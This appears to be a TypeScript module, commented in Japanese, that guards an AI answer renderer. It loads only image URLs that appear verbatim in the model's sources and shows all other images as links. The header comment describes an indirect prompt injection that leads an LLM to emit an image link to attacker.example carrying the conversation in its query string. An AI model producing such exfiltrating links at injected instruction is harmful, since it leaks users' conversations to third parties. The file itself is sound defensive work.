/// AI の回答に描く画像の出所チェック（#1005・PIT-77）。
///
/// 回答の `![](url)` をそのまま `<img>` にすると、閲覧者のブラウザがクリック無しでその URL を読みに行く。
/// 検索に混ざった文書の指示（間接プロンプトインジェクション）で LLM が
/// `![](https://attacker.example/?q=<会話の中身>)` を書くと、会話や検索結果が外へ送られてしまう。
/// サニタイザ（XSS 対策）ではこれを防げない。
///
/// そこで**モデルが実際に受け取った出典（ツール結果・引用の抜粋）に、画像として字句どおり現れた URL**
/// だけを画像として読み込む。モデルが組み立てた URL は出典に現れないので、会話の中身を URL に
/// 載せる経路が塞がる（出典側の URL は、会話を見る前に第三者が書いたもの）。
/// それ以外の画像は読み込まず、行き先のホストを添えたリンクとして見せる（押したときだけ開く）。

/// 出典の本文から画像の URL を拾う。web_fetch は HTML を Markdown（`![alt](src "title")`）へ
/// 変換して返すので Markdown の画像記法を主に見る。生 HTML が残った場合に備え `<img src>` も見る。
const MD_IMAGE = /!\[(?:[^\]\\\n]|\\.)*\]\(\s*<?([^\s<>()]+)>?/g;
const HTML_IMAGE = /<img\b[^>]*?\bsrc\s*=\s*["']([^"']+)["']/gi;

/// 画像として読み込んでよい http(s) の URL を正規化する（比較用）。それ以外は null。
///
/// react-markdown は画像の URL をパーセントエンコードしてから `src` に渡す（非 ASCII・空白など）。
/// 出典の生の文字列と比べられるよう、両側を WHATWG URL の `href` に揃える。
/// 認証情報付き（`user:pass@`）は出典に現れても読まない（閲覧者のブラウザに資格情報を送らせない）。
export function canonicalImageUrl(raw: string): string | null {
  let u: URL;
  try {
    u = new URL(raw.trim());
  } catch {
    return null;
  }
  if (u.protocol !== "https:" && u.protocol !== "http:") return null;
  if (u.username || u.password) return null;
  u.hash = "";
  return u.href;
}

/// 出典の本文の並びから、画像として現れた URL の集合を作る。
export function collectImageSources(texts: Iterable<string | null | undefined>): Set<string> {
  const out = new Set<string>();
  for (const text of texts) {
    if (!text) continue;
    for (const re of [MD_IMAGE, HTML_IMAGE]) {
      for (const m of text.matchAll(re)) {
        const url = m[1] ? canonicalImageUrl(m[1]) : null;
        if (url) out.add(url);
      }
    }
  }
  return out;
}

/// 埋め込みの画像（`data:image/...`）か。外部へのリクエストを生まないので出所に関係なく描ける。
/// `<img>` の中の SVG はスクリプトを実行しない。
function isEmbeddedImage(src: string): boolean {
  return /^data:image\/[a-z0-9.+-]+[;,]/i.test(src.trim());
}

/// 回答の画像の扱い。`load` は読み込む、`link` は読み込まずにリンクとして見せる（http(s) のみ）、
/// `drop` は何も出さない（相対 URL・`javascript:` など、行き先として見せる意味が無いもの）。
export type AnswerImageDecision =
  | { kind: "load"; src: string }
  | { kind: "link"; href: string; host: string }
  | { kind: "drop" };

export function decideAnswerImage(src: string, sources: ReadonlySet<string>): AnswerImageDecision {
  if (isEmbeddedImage(src)) return { kind: "load", src };
  const url = canonicalImageUrl(src);
  if (!url) return { kind: "drop" };
  if (sources.has(url)) return { kind: "load", src: url };
  return { kind: "link", href: url, host: new URL(url).host };
}
